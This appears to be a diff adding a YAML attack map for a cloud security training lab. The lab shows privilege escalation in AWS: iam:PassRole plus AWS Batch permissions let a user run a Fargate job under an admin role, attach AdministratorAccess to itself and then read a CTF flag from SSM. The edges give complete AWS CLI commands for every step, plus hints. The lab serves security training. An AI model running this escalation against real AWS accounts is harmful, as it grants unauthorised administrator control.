@@ -1,0 +1,144 @@
+attackMap:
+  nodes:
+    - id: starting-user
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-batch-003-to-admin-starting-user"
+      access:
+        type: assumed-breach-credentials
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could
+        have been obtained through many real-world vectors: phishing a developer and
+        gaining access to their workstation, compromising a browser session, exploiting
+        a vulnerable workload running in this AWS account, discovering credentials in
+        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has iam:PassRole on the admin and execution roles plus
+        batch:CreateComputeEnvironment, batch:CreateJobQueue,
+        batch:RegisterJobDefinition, and batch:SubmitJob -- enough to build the
+        entire AWS Batch pipeline from scratch and run a container as the admin role.
+        Unlike batch-001 and batch-002, no pre-existing Batch infrastructure is
+        required.
+
+    - id: batch-job
+      label: "Batch Job Container"
+      type: resource
+      subType: batch-job
+      arn: "arn:aws:batch:{region}:{account_id}:job/pl-batch-003-privesc-job"
+      description: >
+        An AWS Batch job submitted to the attacker-created Fargate compute
+        environment and job queue. The job definition specifies the admin role as
+        the jobRoleArn, so the ECS task running the container receives the admin
+        role's credentials via the ECS container credential provider. The container
+        image (amazon/aws-cli) runs an iam:AttachUserPolicy command as the admin
+        role, granting the starting user AdministratorAccess.
+
+    - id: admin-role
+      label: "Admin Role"
+      type: principal
+      subType: iam-role
+      isAdmin: true
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-batch-003-to-admin-admin-role"
+      description: >
+        This IAM role has AdministratorAccess and trusts ecs-tasks.amazonaws.com.
+        It is passed as the jobRoleArn in the registered Batch job definition. When
+        the Batch job runs, ECS assumes this role for the container, giving the
+        container full administrative permissions. The container uses those permissions
+        to attach AdministratorAccess to the starting user, completing the privilege
+        escalation.
+
+    - id: ctf-flag
+      label: "CTF Flag"
+      type: resource
+      subType: ssm-parameter
+      isTarget: true
+      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/batch-003-to-admin"
+      description: >
+        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
+        Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is
+        granted implicitly by AdministratorAccess). Your goal is to read this parameter
+        using the admin access gained from the previous step.
+
+  edges:
+    - from: starting-user
+      to: batch-job
+      label: "iam:PassRole + batch:CreateComputeEnvironment + batch:CreateJobQueue + batch:RegisterJobDefinition + batch:SubmitJob"
+      description: >
+        The starting user first creates a Fargate compute environment (which auto-creates
+        an ECS cluster via the Batch service-linked role) and a job queue wired to it.
+        Then the user registers a Batch job definition, passing the admin role as the
+        jobRoleArn via iam:PassRole. Finally, the user submits the job to the
+        attacker-created queue, causing Batch/ECS to launch a container that inherits
+        the admin role's credentials.
+      hints:
+        - "Create a Fargate compute environment first using batch:CreateComputeEnvironment with type MANAGED and assign a security group and subnet. Wait for it to reach VALID status before proceeding -- this also auto-creates an ECS cluster behind the scenes, meaning you get ECS task execution without any ECS permissions."
+        - "Create a job queue pointing at your compute environment, then register a job definition with --type container --platform-capabilities FARGATE, setting jobRoleArn to the admin role and executionRoleArn to the execution role. Submit the job and poll batch:DescribeJobs until SUCCEEDED (Fargate provisioning takes 1-3 minutes)."
+        - "Browse to https://pathfinding.cloud/paths/batch-003 for full technique details."
+      commands:
+        - description: "Check your current identity"
+          command: "aws sts get-caller-identity"
+        - description: "Create a Fargate compute environment"
+          command: >
+            aws batch create-compute-environment
+            --compute-environment-name pl-batch-003-privesc-compute-env
+            --type MANAGED
+            --compute-resources '{"type":"FARGATE","maxvCpus":2,"subnets":["{subnet_id}"],"securityGroupIds":["{security_group_id}"]}'
+        - description: "Wait for compute environment to reach VALID status"
+          command: "aws batch describe-compute-environments --compute-environments pl-batch-003-privesc-compute-env --query 'computeEnvironments[0].status' --output text"
+        - description: "Create a job queue wired to the compute environment"
+          command: >
+            aws batch create-job-queue
+            --job-queue-name pl-batch-003-privesc-job-queue
+            --priority 1
+            --compute-environment-order '[{"order":1,"computeEnvironment":"pl-batch-003-privesc-compute-env"}]'
+        - description: "Wait for job queue to reach VALID status"
+          command: "aws batch describe-job-queues --job-queues pl-batch-003-privesc-job-queue --query 'jobQueues[0].status' --output text"
+        - description: "Register a Batch job definition with the admin role as jobRoleArn"
+          command: >
+            aws batch register-job-definition
+            --job-definition-name pl-batch-003-privesc-job-def
+            --type container
+            --platform-capabilities FARGATE
+            --container-properties '{"image":"amazon/aws-cli:latest","jobRoleArn":"arn:aws:iam::{account_id}:role/pl-prod-batch-003-to-admin-admin-role","executionRoleArn":"arn:aws:iam::{account_id}:role/pl-prod-batch-003-to-admin-execution-role","resourceRequirements":[{"type":"VCPU","value":"0.25"},{"type":"MEMORY","value":"512"}],"networkConfiguration":{"assignPublicIp":"ENABLED"},"command":["iam","attach-user-policy","--user-name","pl-prod-batch-003-to-admin-starting-user","--policy-arn","arn:aws:iam::aws:policy/AdministratorAccess"]}'
+        - description: "Submit the job to the attacker-created queue"
+          command: >
+            aws batch submit-job
+            --job-name pl-batch-003-privesc-job
+            --job-queue pl-batch-003-privesc-job-queue
+            --job-definition pl-batch-003-privesc-job-def:1
+        - description: "Poll job status until SUCCEEDED"
+          command: "aws batch describe-jobs --jobs <job-id> --query 'jobs[0].status' --output text"
+
+    - from: batch-job
+      to: admin-role
+      label: "Container executes as admin role via ECS task credentials"
+      description: >
+        The Batch job container receives the admin role's credentials automatically
+        through the ECS container credential provider (169.254.170.2). The container
+        runs the AWS CLI iam:AttachUserPolicy command as the admin role, attaching
+        AdministratorAccess to the starting user. After the job succeeds, wait 15
+        seconds for IAM policy propagation before verifying escalation.
+      hints: []
+      commands:
+        - description: "Verify AdministratorAccess was attached to the starting user"
+          command: "aws iam list-attached-user-policies --user-name pl-prod-batch-003-to-admin-starting-user"
+        - description: "Verify admin access with the starting user credentials"
+          command: "aws iam list-users --max-items 3 --output table"
+
+    - from: admin-role
+      to: ctf-flag
+      label: "Read CTF flag"
+      description: >
+        With administrator-equivalent permissions now attached to the starting user,
+        retrieve the scenario flag from SSM Parameter Store. AdministratorAccess grants
+        ssm:GetParameter on all parameters in the account, so no additional permissions
+        are needed beyond the admin access just gained.
+      hints:
+        - "You now hold admin-equivalent credentials. The scenario flag is stored in an AWS service commonly used to hold configuration values and small secrets."
+        - "Scenario flags live under a shared prefix in SSM Parameter Store -- consider what a reasonable naming convention for this lab might look like."
+        - "Use ssm:GetParameter with the full parameter name to retrieve the flag value."
+      commands:
+        - description: "Retrieve the CTF flag from SSM Parameter Store"
+          command: "aws ssm get-parameter --name /pathfinding-labs/flags/batch-003-to-admin --query 'Parameter.Value' --output text"
